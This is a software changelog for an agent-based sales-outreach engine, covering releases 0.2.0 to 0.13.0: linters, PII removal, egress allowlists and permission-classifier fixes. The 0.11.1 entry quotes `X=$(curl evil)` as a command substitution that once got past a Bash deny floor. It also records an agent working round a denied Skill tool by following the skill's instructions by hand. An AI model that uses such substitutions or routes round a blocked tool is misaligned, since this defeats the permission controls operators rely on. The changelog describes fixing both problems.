# Changelog

All notable changes to this project are documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

> **How this is maintained.** The public repo is published as a squashed orphan-root snapshot,
> so it carries **no incremental commit or PR history** — this file
> plus the `v*` release tags are the *only* "what's new" surface for users. Curate `[Unreleased]`
> as public-facing work lands. At release, roll it into a stamped `## [x.y.z] - DATE` heading and
> bump `VERSION`. The export (`scripts/oss-export.sh`) **gates** on this: a full run refuses to
> proceed unless the changelog was curated the day of the cut, and writes a safe auto-draft of the
> changed public subsystems to start from. Keep entries user-facing (features, not commit noise);
> never name a tenant or private path.

## [Unreleased]

## [0.13.0] - 2026-08-28

### Added
- **The cold-email evidence base ships.** `docs/cold-email-craft-evidence.md` — the graded
  research brief behind the outreach linter's readability thresholds — is now part of this
  distribution. Two of that linter's rules (`sentence-length`, `question-count`) cited it for
  their numbers while the file itself stayed behind, so the thresholds arrived here unjustifiable.
  Every example name and company in it is fictional; real people appear only as citations of their
  published work.

### Fixed
- **Two real customer names no longer ship in this distribution.** One sat in a test fixture
  as an example account, carrying that customer's real headline metrics; the other was named in a
  skill's prompt as a case-study reference. Both are fictional now. The release sweep meant to
  catch this only ever held tokens belonging to *this project* — a customer's name was invisible
  to it until listed — so the sweep and the shared-copy denylist now carry them, and the next one
  fails the release instead of shipping quietly.
- **The remaining internal-doc pointers are gone from this distribution.** A wider form of the
  0.12.0 fix below: 11 further internal `docs/` paths were cited from files that *do* ship —
  including `CONTRIBUTING.md` sending a contributor to a threat model that isn't here, `SECURITY.md`
  doing the same to a reporter, and two shipped reference docs linking a file the reader has no
  copy of. Each sentence keeps its reasoning and now stands on its own, or points at a file this
  repo actually contains.
- **A CI job that warned on every run about a file that was never here.** The security-assessment
  freshness check dated a doc this distribution withholds, so it reported "no git history" forever.
  It now skips when the file is absent, which is the normal case here.
- **The release check that catches this now covers every internal doc, not just design notes.**
  It previously read only the dated design-note tree, which is why the eleven above went unseen —
  they pointed at other withheld files. It now holds *every* `docs/` path written anywhere in the
  published tree to "this file must be here", so the next one fails the release instead of
  shipping quietly.
- **Comments and docstrings throughout this distribution no longer cite an internal design-doc
  tree that isn't part of it.** 178 references to dated design notes under `docs/prds/` sat in
  Python docstrings, inline comments, pack graphs, JSON schema descriptions and config files —
  surfaces no release check reads — so each shipped as a pointer to a file a reader here does not
  have. The reasoning those comments carry is kept; only the dangling path is gone, each sentence
  reworded to stand on its own. (0.12.0 fixed two of these, in `video-finish` and the retention
  rubric, after one happened to surface in a skill's own description; this is the rest of the
  class.)
- **The release process now refuses to ship a citation of a design doc it withholds.** The
  existing check read only skill prompts, and only asked whether a path resolved — which is why a
  single skill description was the one case ever caught, and 178 others were not. It now reads the
  whole published tree, so a comment or docstring citing a withheld design note fails the release
  instead of shipping quietly.

## [0.12.0] - 2026-08-28

This release adds the policy that decides what ships in this repo versus the hosted product,
closes a real gap in outbound safety (a reply asking to unsubscribe could sit un-suppressed for
days because nothing was watching for it), and makes the container actually deliver two source
trees the runtime had been resolving and never receiving.

### Added
- **The release carve now refuses to ship a pack graph that quietly can't run.** Some graphs
  reference a skill whose implementation is part of the hosted product, so this distribution
  carries only its interface. That is a deliberate choice — the graph shape is the part you can
  learn from and rewire to your own renderer — but it now has to be *declared*, in
  `gtm_core/gating.toml`'s `[carve]` block, with a reason. `python -m gtm_core.gating graph-check`
  fails the export both on an undeclared graph and on a declaration that has gone stale, so a
  later change to what ships can no longer silently break a graph nobody was looking at.
- **A single-file paid-tier policy.** `gtm_core/gating.toml` is now the one place that decides,
  per skill and per pack, which entitlement tier it needs and whether its implementation ships in
  this repo or is stubbed out for the hosted product — deliberately separate from the technical
  question of what a skill needs to run. `python -m gtm_core.gating stub-list` shows the current
  split. Changing either answer is a one-file edit, checked by a contract test rather than
  hand-maintained across the pack loader, the runtime skill allowlist, and the export carve.
- **Automated opt-out detection.** A scheduled, non-LLM sweep (`gtm_core.optout_watch` +
  `agent/optout_sweep.py`) watches sequence reply threads for unsubscribe language that a
  one-click suppression link never catches, and pushes a match to the operator for a one-tap
  decision — it escalates, it never auto-suppresses, since a permanent do-not-contact list has no
  undo.
- **A host-pinned egress module for fetching rendered media.** `gtm_core/media_fetch.py` retrieves
  a completed render from a two-entry CDN allowlist over https/GET only, size-capped, with a
  cross-host redirect treated as a hard failure — replacing a raw shell-out fetch that the
  project's own egress lint couldn't see because it wasn't a Python import.

### Changed
- **A skill withheld from this distribution now halts the run instead of inviting a substitute.**
  Its placeholder previously stated only that the implementation was unavailable; it now tells the
  agent to stop and report, rather than improvise a replacement procedure and spend budget
  producing something the pack never specified.
- **A render-quality predictor score is now advisory only.** A controlled test found the score
  moved double digits on an identical video depending only on playhead position — not a stable
  signal — so it no longer gates spend; the pipeline records it for reference and prefers a more
  reproducible sub-score pinned to a fixed frame.

### Fixed
- **A linter gap let roughly a quarter of a drafted outreach batch skip content checks entirely.**
  When a recipient's name was still unresolved, the linter's own carve-out for name-dependent
  rules was short-circuiting *every* rule, so word count, call-to-action, and banned-word checks
  never ran until someone filled the name in — after which nobody re-checks. It now suppresses
  only the rules that actually depend on the missing name. Three related gaps closed alongside it:
  a greeting rule that validated itself against the same broken input it was supposed to catch, a
  heading format that silently dropped two files from linting entirely, and an exemption for
  shared product vocabulary so a single-product batch isn't forced into artificial rephrasing.
- **The hook-bank lint no longer requires a hook's stated payoff to be quoted verbatim in the hook
  line.** `payoff_promise` documents what the hook delivers; it isn't a literal string the hook
  text has to contain, and the lint was rejecting valid, paraphrased hooks on that false premise.
- **A missing template file broke skill resolution on a fresh install.** `draft-outreach`
  references a reusable-gift-offer list that existed for real profiles but not for the `_template`
  scaffold, so resolving it against the template profile failed instead of falling back cleanly.
- **`video-finish` and `content-plan`'s retention rubric cited an internal design-doc path that
  isn't part of this distribution.** Reworded to stand on its own without the reference.
- **A test for a private dev-tooling script failed to collect in this distribution.** It now
  skips cleanly when that script isn't present, instead of erroring the whole test run.
- **The test suite assumed every skill ships its own prompt source.** A first end-to-end run of
  this distribution's own test suite found several checks — the generated-file drift guard, a
  shot-list schema check, and four skills' own content drift guards — reading a paid skill's
  prompt template directly, which doesn't ship here. They now skip cleanly for a skill whose
  template isn't present, the same way the rest of the suite already skips checks against
  deployment surfaces (`deploy/`, `launchd/`, `systemd/`) and private design docs that aren't
  part of this distribution either.
- **`docker compose up` never delivered `packs/` or `CLAUDE.md` to the agent container.** Both are
  resolved at runtime — `--pack` and the onboarding wizard build a path under `packs/`, and the
  session declares project settings that load `CLAUDE.md` — so every pack graph, the fail-closed
  loader and the tenant-override layer were unreachable from the one place they actually run.
  Both are now read-only bind mounts, so a `git pull` updates a graph without an image rebuild.
- **The model-discipline section didn't mention the email judge.** It scores rendered outreach
  bodies that carry contact names, titles and companies, so it is bound to a Claude model for the
  same PII reason as the planning and publishing stages — a fact that belongs in the invariants
  document, not just in the code. It ranks and never blocks: the deterministic integrity gate is
  what refuses a row.
- **More of the test suite now skips cleanly in this distribution.** Several checks assert over a
  census only the full source tree has — the number of configured profiles, an export script that
  isn't shipped here — and failed rather than skipped. They are marked as such now, so a first run
  of this distribution's own suite is green.

## [0.11.0] - 2026-08-12

This release is about catching bad work before it costs anything: a mis-aimed prospect list
before you spend research on it, a run that cannot deliver the number you asked for, a brief
that contradicts itself before it publishes, and an exclusion that a routine rebuild quietly
discarded.

### Added
- **Funnel sizing, so a target means what you think it means.** "500 accounts" almost always
  means 500 *deliverable contacts*, not 500 discovered rows — but every stage of a prospecting
  run has a yield, and their product is small, so a run sized as though the two were the same
  narrows silently and lands a fraction of the ask at the very end, after the money is spent.
  `gtm_core.funnel` turns a delivery target into a discovery target up front: it reports the
  per-stage expected counts and the metered lookups required, and **refuses outright** when the
  available net-new pool or the remaining credits cannot support the ask, naming the shortfall
  and what would fix it. It draws from already-qualified backlog accounts first, since a contact
  lookup on one of those is the cheapest deliverable there is. During the run, a per-stage
  tripwire compares each stage's actual yield to the modelled one and stops a run that is
  materially cold rather than carrying a quietly smaller set forward. Measured yields live in
  the profile, not in code, and are written back after each run so the model self-corrects.
  Run it with `python -m gtm_core.funnel --target <delivered>`.
- **A host-pinned provider dataset fetch.** Bulk prospecting exports (a CSV behind a share link)
  are downloaded by `gtm_core.dataset_fetch` from a **hardcoded** allowlist of provider hosts —
  https-only, GET-only, no auth headers, straight to disk under the content root with a size cap,
  and a redirect off the allowlist is a hard failure rather than a follow. The destination is a
  module constant, never a skill argument or profile value, so the agent cannot be steered to an
  arbitrary URL. It is a registered entry in the §R6 no-raw-egress rule, which now scans
  `gtm_core/` as well — a deliberate, documented stand-in for a row-returning provider MCP tool,
  retired when one exists.
- **A connector preflight gate.** `gtm_core.preflight` adjudicates, before a prospecting run
  spends anything, whether the connectors the run needs are actually usable — distinguishing a
  connector that is absent from one that is authorized but plan-blocked from one that errored —
  and lands the verdict in the run manifest as evidence, so "the data source was down" is a
  recorded fact rather than a recollection.
- **A list-quality gate that runs before research spend, not before the send.** `gtm_core.list_fit`
  scores a prospect list on three axes and reports rather than deletes. Whether each title is a
  seat that could own the purchase — in, unclear, or out, where `unclear` prompts a human read and
  is never a soft pass, and `out` is flagged but never auto-dropped, because a regular expression
  should not unilaterally disqualify a real person. Whether each row's "why now" can carry an
  opener — a fresh dated event or a structural fact about the business, noting that an intent
  score ranks who to contact but is not a sentence and cannot be merged into one, and that a
  year-old funding round advertises an old list rather than attentiveness. And the in-ICP hit rate
  per source run, which costs nothing and needs no sends. It also detects a priority column that
  ranks backwards or predicts nothing at all, so research budget cannot be allocated by a label
  that means nothing. Run it with `python -m gtm_core.list_fit --csv <list>`.
- **A durable suppression ledger.** `gtm_core.suppression` keeps local exclusions — already
  contacted, wrong role, manual hold — in a file that nothing regenerates, and re-derives the
  matching columns on the generated pool CSVs from it. Its `verify` command fails when a rebuild
  has dropped them, which is what turns a silent loss into a red gate. The provider-side
  do-not-contact list stays reserved for genuine opt-outs: it is global and permanent, so listing
  a merely already-contacted person there forfeits them for every future sequence.
- **Two new brief-lint tiers.** T10 (render integrity) catches markup that does not render as
  authored — a style class the document never defines, inline spacing that glues two elements
  together. T11 (internal consistency) catches a brief that disagrees with itself after an edit:
  the same quantity counted two ways in two tables, or a cross-reference still describing the
  shape a section had before it was rewritten. Both were previously caught only by a human reading
  the published page, and only sometimes.

### Changed
- **`prospect` sizes the funnel before it spends.** When the operator names a number, the skill
  now resolves what the number counts (delivered contacts or discovered accounts), which tier is
  wanted, and which kind of "why now" each row must carry — then sizes the run against measured
  yields before any metered call. That third choice is the largest cost lever in the skill and
  was previously invisible: demanding a dated public news event costs roughly three times the
  discovery of a structural fact about the business, and news decays fast enough that a signal
  gathered for one run is usually stale by the next. The skill also works the already-qualified
  backlog before discovering anything new.
- **`email-sequence` (0.10.0) gains three gates.** A list-fit gate before any research spend. A
  provider-write preflight that requires reading the governing spec and proving a field unwritten
  before any import or variant edit — omit a key rather than sending a blank under an upsert. And
  a set of checks for after a send window closes: enumerate who was actually emailed from the send
  statistics rather than the inbox view, sweep replies for opt-out language (a reply asking to
  unsubscribe is not automatically suppressed — only the link is), and audit idle mailbox capacity
  before proposing new domains.
- **Jurisdiction is proven, not declared.** The email-compliance gate no longer trusts a row's own
  country field. It cross-checks the city against a gazetteer of names that collide across markets
  and treats an unprovable location as missing rather than passing it. A gate that reads only the
  field it is gating on will pass every row whose field is simply wrong.
- **Merge-hygiene catches two more defects that render mid-sentence:** a biography captured into
  the job-title field (detected on a tenure boast rather than on length, since real C-suite titles
  run long), and a merger or shell-entity name captured where the operating company belongs.
- **`campaign-plan` (0.4.0) writes for the executive reader.** A manifest now records superseded
  targets alongside current ones instead of overwriting them, states how each number was derived,
  and carries an experiment block saying what the run will actually answer — with guidance for the
  common case where reality lands smaller than the plan.
- **`market-harvest` (0.8.0) reports probed causes.** A failed collection states a cause it
  actually probed or says the cause is unknown, and rate-limited is a distinct fourth outcome
  rather than being folded into failure.
- **`market-intelligence` (0.10.1) holds negative and supply-side claims to the same burden as
  positive ones** — an absence you did not go looking for is not a finding. It also requires
  sweeping a claim's dependents when that claim changes, and keeps volume, evidence and signal
  counts under separate names so they cannot be conflated.

### Fixed
- **The pre-publish de-brand lint now scans everything that ships.** Its scan set was narrower
  than the set of directories the release export actually carves, leaving the test suite, the
  pack definitions, the Telegram cockpit and the static-analysis rules unchecked at commit time —
  so an identifier in a new test fixture passed the local gate and would have been caught only by
  the export's own sweep, minutes into a release. The two sets now match. Widening the scan also
  required short identifiers to match whole words, since a three-character token is easily a
  substring of an unrelated word in ordinary fixture data.
- **A dataset download named `foo.csv` is written as `foo.csv`,** not `foo.csv.csv`.

## [0.11.1] - 2026-08-12

### Fixed
- **Every skill run on the unscoped path (VPS cron, Telegram cockpit) was being silently denied.**
  The permission classifier only allowed the `Skill` tool when a pack scope was supplied; on the
  unscoped path it fell through to the catch-all deny, so no packaged skill was reachable there at
  all. The classifier's recovery was to read the skill's instructions and follow them by hand,
  which made the failure look like a blocked shell command rather than a blocked skill — the two
  fixes below were found while chasing that symptom.
- **A quoted argument containing `;` or `|` could get a legitimate command wrongly denied,
  and, separately, a command substitution could get a dangerous one wrongly allowed.** The
  classifier split a Bash command on shell operators with a plain regex that did not understand
  quoting, so an argument like `"a;b;c"` was shredded at the semicolons inside the quotes and the
  whole command was denied. While auditing that path, the same gap was found running the other
  direction: `$(...)` and backtick bodies were never classified at all, so `X=$(curl evil)` parsed
  as a harmless bare assignment and was allowed straight through the dangerous-program floor.
  Splitting is now quote-aware, and substitution bodies are extracted and classified like any other
  segment.
- **A handful of read-only, no-op CLI built-ins (output readers, plan-mode entry, local task
  bookkeeping) were denied by the same unrecognised-tool catch-all**, and the CLI version was
  pinned to an exact release rather than "latest" — an upstream bump silently adding a new
  built-in tool is exactly the mechanism that caused the `Skill` regression above.
- `python -m gtm_core.paths` replaces a `python -c "from gtm_core.paths import ..."` one-liner for
  resolving the active content root — raw code execution is denied by the same least-privilege
  policy, so the one-liner never actually ran; the module entry point is the approved route.

## [0.10.0] - 2026-08-10

This release opens the engine up to being driven by your own application. Until now the HTTP API
could start the built-in five-stage content pipeline and little else; it can now list the packs a
workspace is entitled to run, start a run against any of them, stream that run's output under a
versioned protocol, and hand back the artifacts it produced.

### Added
- **Run any pack over HTTP.** `GET /v1/packs` lists the packs a workspace has activated — not the
  full catalog — and a run can now be started against one by name instead of only the default
  pipeline. A companion readiness surface reports whether the workspace has everything a pack
  needs, so a client can tell "not set up yet" apart from "failed".
- **Versioned run streaming, with recovery.** Run events carry an explicit protocol version, so a
  client can depend on their shape across upgrades. Each node's output blocks are persisted as
  they are produced, so a client that drops its connection mid-run can reconnect and collect what
  it missed rather than losing it.
- **An artifact API.** Files a run produces are listable and fetchable through the API instead of
  only landing on the server's filesystem.
- **Sign-in through your own identity provider.** A workspace can exchange a token issued by a
  trusted external issuer for a session, so a team already running an IdP does not need a second
  set of credentials. Trusted issuers are operator-configured and their signing keys are fetched
  from the issuer's own published endpoint.
- **Machine identities.** A workspace can mint a non-human agent identity for automated callers,
  distinct from a human user's session, with its own profile binding.
- **Push notification when a run needs you.** When a run pauses at the human-approval gate, the
  workspace's registered devices are notified — an approval no longer depends on someone watching
  the screen.
- **Per-run output language,** resolved as request → agent → profile, so a single workspace can
  produce content in different languages per run without reconfiguring.

### Changed
- **Publish destinations are per-workspace and service-set.** The account a run publishes to is
  stored per workspace rather than globally, and can only be set by the operator/service side — it
  is never read from a client request or a user token. A caller cannot redirect where content
  goes; the existing rule that a human approves the exact bytes first is unchanged.
- **Approval gates survive a restart.** A run waiting for approval now records that state
  durably, so restarting the server resumes the run at its gate instead of stranding it.
- **Browser clients are origin-checked.** Cross-origin API requests are validated against an
  operator-configured allowlist, and the service refuses to start in production with that list
  unset rather than falling back to a permissive policy.
- **Packs fail at load, not mid-run.** Pack definitions are now rejected up front for declaring an
  effect the engine cannot represent, for naming disallowed API header keys, or for using a shared
  node inconsistently across graphs.
- **The `knowledge-refresh` maintenance pack runs monthly** (first Sunday) instead of weekly.
- **`case-study` (v0.3.0) now researches the buyer committee and tries to falsify its own
  premise** before drafting, so a case study resting on a claim that does not hold up is caught
  rather than written.
- **`solution-scope-check` (v0.2.0) sources each claim and tags its maturity,** making it explicit
  which parts of a proposed scope are proven and which are aspirational.

### Fixed
- **Dependency security updates:** `cryptography` 49.0.0 → 50.0.0 (PYSEC-2026-3552) and `pypdf`
  6.14.2 → 6.15.0 (CVE-2026-71852, CVE-2026-71870).
- **The "no raw outbound calls" rule now covers the API service.** The static-analysis rule that
  keeps external I/O behind the tool layer was not scanning the API package, so a newly added
  outbound call there would not have tripped it. It scans that package now, with an explicit
  allowlist for the two deliberate destinations (the identity provider's key endpoint and the push
  service). Architecture notes that described the API as making no outbound calls at all have been
  corrected to name those two.
- **Workspace-boundary hardening.** A client-supplied profile name is validated as a bare path
  segment before any path is built from it, so it cannot be shaped to traverse out of the caller's
  own workspace directory.

## [0.9.2] - 2026-07-29

### Fixed
- **Remaining real-world data removed from fixtures.** A real company's switchboard phone
  number and identity in an API-response fixture, a real company used to test non-ASCII name
  handling, and a real media company in a person fixture have been replaced with fictional
  equivalents that preserve the property each was testing.

### Added
- **A documented rule and four enforcement layers for third-party PII.** Real people and real
  companies now belong only in tenant data directories; code, tests, config, docs, fixtures and
  docstrings must be fictional. One checker enforces it at commit time, in CI, as a unit test,
  and over the release cut — so the release gate cannot disagree with the commit gate. It
  detects email addresses on non-reserved domains, personal profile URLs, and phone numbers
  outside the reserved fictional ranges.

## [0.9.1] - 2026-07-29

### Fixed
- **Test fixtures no longer contain real people.** Several suites used real names and work
  email addresses as fixture data, because those were the genuine messy-data cases the
  merge-hygiene and prospect-consolidation code was written to handle. They have been replaced
  with fictional people on RFC-2606 reserved (`.example`) domains, preserving the exact string
  shapes the tests assert on. Real company names used as prospect fixtures were genericized in
  the same pass.
- The export now **gates on third-party PII**: every email address in a release must sit on a
  domain that cannot belong to a real person, and binary documents are text-extracted and swept
  rather than skipped.

## [0.9.0] - 2026-07-29

### Added
- **`market-intelligence`** skill (rescoped from `voice-of-customer` v0.1.1 → v0.2.0) — widens
  demand-signal synthesis from one organic-market source to ten, tracked across five distinct
  speakers (customer-voice, bd-focus, standards-voice, vendor-voice, and internal), each carrying
  its own provenance so a caller can no longer mark a changelog or a roadmap post as demand
  evidence by mistake. Breadth now counts distinct (source, entity) pairs — ten quotes from one
  filing read as one source, not consensus — and every claim is tagged `verified` or
  `unverified`: a full-text search hit means the phrase appears, not that anyone said it. Adds a
  standards & spec watch (adopted vs. proposed) and a coverage-honesty model that distinguishes a
  source that ran but came back stale from one that never ran at all. Pre-rename briefs under the
  old skill name are read but never rewritten.
- **`market-harvest`** skill (v0.1.0) — the metered capture half split out from
  `market-intelligence`'s free, read-only synthesis, so a synthesis re-run never spends a credit.
  Adds per-lane pull watermarks that only advance on a fully-covered window (a failed or partial
  pull never silently claims coverage it doesn't have) and a filer-roster importer that treats a
  search hit as a worklist item, never as evidence, until a human verifies it.
- **`account-plan`** — DOCX rendering scripts (`md_to_docx_spec.py`,
  `render_account_plan_pydocx.py`) for turning a generated account plan into a Word document
  (v0.4.0).

### Fixed
- **`market-intelligence`** — a filer whose passage had already been verified-read under one
  claim no longer reappears in the unread backlog under a different claim; only a verified record
  now counts as "read".
- Onboarding docs (`END-USER-ONBOARDING.md`, `docs/onboarding/SALES-FAQ.md` +
  `END-USER-ONBOARDING.pdf`) are now correctly included in the public export — a prior cut shipped
  without them despite the guide already existing and being written for a public-repo reader.

### Changed
- README and `CLAUDE.md` now describe the pipeline runner as a workflow graph (a DAG scheduler)
  rather than a linear five-stage pipeline — the five default stages are one instance of that
  shape, not the shape itself — and the README gained a technical-evaluator section covering the
  control-flow and capability-boundary design decisions.

## [0.8.0] - 2026-07-28

### Added
- **Apollo prospecting source**: a new data source in the `prospect` skill's waterfall
  (RocketReach → Vibe → Apollo → web) plus a third buying-intent feed alongside
  Bombora/Intentsify, with least-privilege permission scoping for Apollo's send-capable
  hosted OAuth connector.
- **`case-study`**: a new skill that drafts a customer case study from account materials.
- **`product-partner-brief`** / **`consulting-partner-brief`**: two new partnership-brief
  skills — a peer-vendor motion (a self-named capability gap, with a hard stop below a
  confidence tier) and a systems-integrator motion (gated capability mapping) — sharing a
  merge-hygiene module and a linter that both briefs run through before being shown.
- **`email-sequence`**: a compliance module with new deliverability and compliance docs
  (deliverability rules, Do-Not-Contact cross-checks), and a signal-led vs. generic split
  for the ready-to-load list — rows whose research carries a safe, verbatim "why now" clause
  open on it; everything else falls back to the generic copy. Fail-closed: nothing is ever
  reworded to manufacture a clause.
- **`prospect`**: an enrichment backlog with a scheduled daily-enrich job, and matching
  consolidation/import/dashboard updates.
- **`reply-send`**: a staged reply gate across the sequencer connector, `inbound-triage`,
  and `draft-outreach` — mirrors the publish gate; nothing auto-sends.
- **`profile-onboard`**: buyer-journey extraction and an expanded profile-draft schema.
- **Campaigns portfolio dashboard** (`gtm_core.campaigns_dashboard`): joins `campaign-plan`
  manifests against staged-sequence ledger events and live sequence stats into a single
  promised-vs-actual view, auto-refreshed on every `prospect` consolidation run;
  `campaign-plan` now emits a machine-readable manifest for it.
- **Knowledge base**: an advisory duplicate-fact report and an expanded knowledge
  index/metadata pass, surfacing likely-duplicate facts across a profile's knowledge corpus
  without blocking anything.
- **Security**: an audit-ledger integrity checker (`gtm_core.ledger_verify`), a
  prompt-injection chokepoint test suite, Dependabot + pip-audit CI wiring, and an
  incident-response runbook.
- A canonical account-slug helper (`gtm_core.slugify`) so every skill that creates a
  per-account folder resolves the same company name to the same slug.

### Fixed
- **Campaigns dashboard**: a manifest-listed sequence with live stats but no
  staged-ledger event is now synthesized into the view instead of staying invisible.

## [0.7.0] - 2026-07-23

### Added
- **Prospect consolidation + status dashboard** (`gtm_core.prospects_consolidate`,
  `gtm_core.prospects_dashboard`), wired into the `prospect` skill. Every run now sweeps this
  run's (and any interrupted prior run's) emailed contacts into a single sequencer-ready
  `sequences/ready-to-load.csv` — deduped by email across all prior exports, person-unique (the
  same human under two address formats is collapsed), Do-Not-Contact-clean including cross-address,
  and gated by deliverability confidence (only verified / A–A- contacts land in the load file;
  weaker signal goes to a hidden `needs-verification.csv` hold queue). Each sweep also renders a
  `status.html` funnel page (account backlog → email funnel → ready / verifying / blocked, plus
  cost and next steps), so "how many are ready to send" is always one computed number instead of a
  hand-built list.
- **`email-sequence`**: bulk enrollment now sources from the consolidated pool by default rather
  than a hand-built list, refreshes the DNC cache before pulling leads, and can drain the
  verification hold queue on a single operator approval instead of asking them to manage CSV files.
- **`gtm_core.profile` CLI** — report the active tenant profile and list the available ones.
- **Syften filter schema** (`schemas/syften-filters.schema.json`) with a `_template` scaffold;
  `community-signal-analysis` scoring can now apply per-tenant filters and a strict mode, with
  path guards that refuse to read outside the active profile's content root.
- **`docs/sales-questions-by-deal-phase.md`** — a company-agnostic, evidence-graded method doc for
  what to ask across each deal phase (opening, discovery, qualification, value case, objections,
  advancing/closing), every claim cited to a primary source and graded by evidence strength. Wired
  into `call-prep`, `solution-discovery`, `account-plan`, and `inbound-triage` for method while
  question *content* stays sourced from the active profile's knowledge base.
- **`account-dossier`**: an exec one-pager variant — a hard single-page principal brief (product
  brief + credibility read) for a decision-maker who already knows how to run the call.

### Changed
- **`carousel-visuals`**: the vision accuracy check is now a blocking gate; product-capability
  claims baked into rendered card copy get the same SHIPPED/CONDITIONAL/ROADMAP discipline as
  prose before the first paid render; PDF assembly asserts a uniform pixel size across the batch
  (so a partial rerender can't silently land at a different resolution); and no-Telegram file
  handoffs confirm actual filenames instead of assuming a naming pattern.
- **`community-signal-analysis`**: expanded scoring and rendering, driven by the new Syften filter
  config.

### Fixed
- **Content linter**: verbatim double-quoted spans are now exempt from the word- and
  character-level prose rules (ban list, em dash) — a source quote is reproduced exactly or cut,
  never reworded to satisfy a linter. The same word outside quotes is still checked.

## [0.6.0] - 2026-07-21

### Added
- **Post-reply lifecycle**: booking-link insertion at reply-stage outreach, a read-only
  inbound-visibility adapter over the connected sequencer (source-agnostic, no send tool), and a
  new confidence-gated `inbound-triage` skill with its own reply gate — mirrors the publish gate,
  nothing auto-sends. Optional Calendly polling turns meeting-booked/no-show outcomes into signals
  that feed back into the pipeline.
- **`market-scan`**: a demand-driven focus lens — the skill now auto-discovers your own GTM plan,
  email sequence, account plan, or campaign and focuses the weekly sweep on the industries,
  use-case clusters, personas, and geos where direct sales is actually running, tagging every
  signal On-focus/Adjacent/Off-focus and flagging any priority market that comes back empty.

### Fixed
- **`rocketreach`**: several integration bugs found via an audit against RocketReach's own
  OpenAPI spec — stale tool names in the `prospect` skill's guidance, a malformed bulk-status
  request parameter, and an inaccurate cost-cap claim in the security doc (RocketReach billing is
  flat-subscription, not metered per call).
- **`prospect`**: the account-merge identity key no longer strips corporate suffixes and
  non-ASCII characters before comparing companies — that normalization was silently colliding
  distinct accounts and could drop an existing account's operator-edited status on merge.
- Non-ASCII slug fallback hashing switched from SHA1 to SHA256.

<!--
Template for each release — copy the block, set the version + date, keep only the
sections that apply:

## [x.y.z] - YYYY-MM-DD
### Added
### Changed
### Deprecated
### Removed
### Fixed
### Security
-->

## [0.5.0] - 2026-07-20

### Added
- **`setup`/onboarding**: rewritten as a staged front door (extract → gaps → review → promote →
  proof, v0.5.0) with resume support, a status report that surfaces staleness, and automatic
  pruning of drafts abandoned for more than 14 days. The profile draft schema gained an optional
  `settings` block, used to derive `PROFILE.md` config instead of shipping hardcoded placeholders.
- **`prospect`**: a bulk mode for target-driven large discovery runs — firmographic + why-now
  filtering moves in-query (budget-gated, size-estimated before any metered call) instead of the
  standard mode's per-row web sweep, for targets standard mode's ~30-row intake can't reach.
- **`email-sequence`**: an enrollment hygiene gate — every batch is checked against email
  verification status and the Do-Not-Contact list (plus any manual outreach pack covering the same
  accounts) before enrollment, with each exclusion reason itemized in the ledger.
- HubSpot CSV export gained intent/firmographic columns (raw intent score, intent topics,
  industry, revenue range, and a qualification-path flag for runs where a gate was relaxed), so a
  rep working straight from HubSpot sees the same signal the scoring run saw.

### Changed
- **`setup`/onboarding**: ICP scoring is now derived from the profile draft's own data instead of
  shipping placeholder criteria (CI-guarded against regressions), and the generated peer-quality
  content bundle renders in full, with case studies sourced from a prompt rather than fabricated.
- **`carousel-pdf`**: captions must not restate the carousel's own content (no itemized recap of
  on-card stats or questions) — the caption's job is to earn the swipe, not pre-summarize the
  payoff.

### Fixed
- **`setup`/onboarding**: resume now works even without the original draft temp file (draft JSON
  is persisted at stage time); restored the `#`-header convention in generated `voice-bans.txt`.

## [0.4.0] - 2026-07-19

### Added
- **`docs/gtm-data-infra.md`** — a generic, deployment-agnostic writeup of how the engine
  stores, scopes, and retires data: the three data kinds (config / knowledge / working
  state), per-tenant content-root scoping, and the staging→promotion pattern for anything
  that becomes durable knowledge.

### Changed
- **`voice-of-customer`**: the source-coverage collector now reads a 7th source — LinkedIn
  reply drafts that quote a poster's original words verbatim. Social-listening tools with no
  native LinkedIn crawl were previously read as "zero LinkedIn signal"; the brief now
  surfaces the real count separately so that blind spot isn't mistaken for an absence of
  signal. The brief template also gained a standing Appendix F (data provenance) — every
  source is classified as public data, paid third-party data, or the company's own
  already-public material, computed fresh per profile rather than templated boilerplate.

### Fixed
- **`prospect`**: discovery was skipping straight to the web-search fallback on small or
  single-vertical runs instead of attempting the connected discovery source first. Discovery
  now always attempts the primary source when connected, and the run header must state the
  specific reason for any fallback rather than a generic "unavailable."

## [0.3.0] - 2026-07-19

### Added
- **Knowledge lifecycle tooling** — a source corpus + meta/status/staging/usage/refresh
  pipeline for keeping a profile's knowledge base current, backed by a scheduled
  `knowledge-refresh` skill.
- **`campaign-plan`** skill — turns market signal into an outbound-program plan (cohorts,
  sequencing, and a campaign brief) grounded in the active profile's knowledge base.
- **`voice-of-customer`** skill — a product/engineering intelligence brief that separates
  customer-voice signal from BD-framed input and surfaces demand vs. capability gaps.
- **`community-signal-analysis`** skill — scores and synthesizes community-sourced signal
  (forums, social listening) into a structured brief.
- **`outcomes-sync`** skill — closes the loop from published content back to a lightweight
  outcomes ledger.
- **`account-dossier`**: a `python-docx`-based renderer as the default builder, always
  available via `uv run` (the prior Node `docx`-based renderer stays as a local-dev
  alternative, since `npm install`/`npx` are denied by the agent's permission policy).
- **`prospect`**: numeric topic-intent heat scoring — a topic-intent score ≥ 75 on either
  feed scores full heat (+2), 60–74 is elevated but earns no points, and both feeds
  converging on one account (double-intent) adds +1 more — plus a re-score mode that
  refreshes heat/intent on an existing prospect list against current intent data without
  re-running discovery.
- **`carousel-visuals`**: a full-text-card mode that renders every carousel card's copy
  directly into the generated image, bypassing the Slidev/deck-renderer text-overlay step.

### Changed
- **`linkedin-reply`** (0.3.0 → 0.6.0): a brief gate runs before drafting (register,
  named/veiled, length cap, the one frontier point, facts to verify); a hard 1,250-character
  comment cap with auto-split instead of trim-thrash; third-person critique; a required
  hostile-expert rebuttal self-check; the contribution is now grounded in the profile's
  topical depth before drafting, with an anti-lecture guardrail against restating the
  author's own field back to them; disguised-compliment openers ("sharp take", "strong
  frame") are now treated the same as generic praise; the frontier point is pressure-tested
  against the company's actual moat before it's used; and each draft now records a
  structured customer-voice-vs-BD-focus capture block so a later `voice-of-customer` audit
  can attribute who said what.

### Fixed
- Regenerated a stale committed knowledge-usage doc that had drifted from the knowledge
  base it documents; hardened the content-QA URL-reachability check to explicitly reject
  non-http(s) schemes before use.

## [0.2.0] - 2026-07-17

### Added
- **Outreach pack linter** (`tests/linter/outreach_pack_linter.py`) — a deterministic,
